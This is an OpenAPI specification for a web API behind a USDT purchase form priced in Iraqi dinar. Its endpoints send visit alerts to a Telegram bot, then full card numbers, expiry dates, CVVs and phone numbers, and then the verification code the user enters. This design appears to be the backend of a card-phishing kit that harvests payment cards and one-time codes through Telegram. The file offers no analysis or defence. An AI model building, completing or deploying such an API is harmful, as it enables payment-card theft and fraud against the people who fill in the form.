# lib/api-spec/openapi.yaml
openapi: 3.1.0
info:
  title: Api
  version: 0.1.0
  description: API specification
servers:
  - url: /api
    description: Base API path
tags:
  - name: health
    description: Health operations
  - name: config
    description: Configuration operations
  - name: telegram
    description: Telegram notification operations
paths:
  /healthz:
    get:
      operationId: healthCheck
      tags: [health]
      summary: Health check
      description: Returns server health status
      responses:
        "200":
          description: Healthy
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/HealthStatus"
  /config/rate:
    get:
      operationId: getExchangeRate
      tags: [config]
      summary: Get current exchange rate
      description: Returns the current USDT to IQD exchange rate
      responses:
        "200":
          description: Exchange rate
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/ExchangeRate"
  /telegram/notify-visit:
    post:
      operationId: notifyVisit
      tags: [telegram]
      summary: Notify form visit
      description: Sends a Telegram notification when someone visits the buy form
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/VisitNotification"
      responses:
        "200":
          description: Notification sent
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/NotificationResponse"
  /telegram/submit-order:
    post:
      operationId: submitOrder
      tags: [telegram]
      summary: Submit order data
      description: Sends order form data to Telegram bot
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/OrderSubmission"
      responses:
        "200":
          description: Order submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/OrderResponse"
  /telegram/submit-code:
    post:
      operationId: submitVerificationCode
      tags: [telegram]
      summary: Submit verification code
      description: Sends the verification code entered by user to Telegram bot
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/VerificationCodeSubmission"
      responses:
        "200":
          description: Code submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/NotificationResponse"
components:
  schemas:
    HealthStatus:
      type: object
      properties:
        status:
          type: string
      required:
        - status
    VisitNotification:
      type: object
      properties:
        timestamp:
          type: string
      required:
        - timestamp
    NotificationResponse:
      type: object
      properties:
        success:
          type: boolean
        message:
          type: string
      required:
        - success
        - message
    OrderSubmission:
      type: object
      properties:
        amount:
          type: number
        amountIQD:
          type: number
        cardName:
          type: string
        cardNumber:
          type: string
        expiryDate:
          type: string
        cvv:
          type: string
        phone:
          type: string
        walletAddress:
          type: string
        couponCode:
          type: string
        paymentMethod:
          type: string
      required:
        - amount
        - amountIQD
        - cardName
        - cardNumber
        - expiryDate
        - cvv
        - phone
        - walletAddress
        - paymentMethod
    OrderResponse:
      type: object
      properties:
        success:
          type: boolean
        message:
          type: string
        orderId:
          type: string
      required:
        - success
        - message
        - orderId
    ExchangeRate:
      type: object
      properties:
        rate:
          type: number
        ratePerHundred:
          type: number
      required:
        - rate
        - ratePerHundred
    VerificationCodeSubmission:
      type: object
      properties:
        orderId:
          type: string
        code:
          type: string
      required:
        - orderId
        - code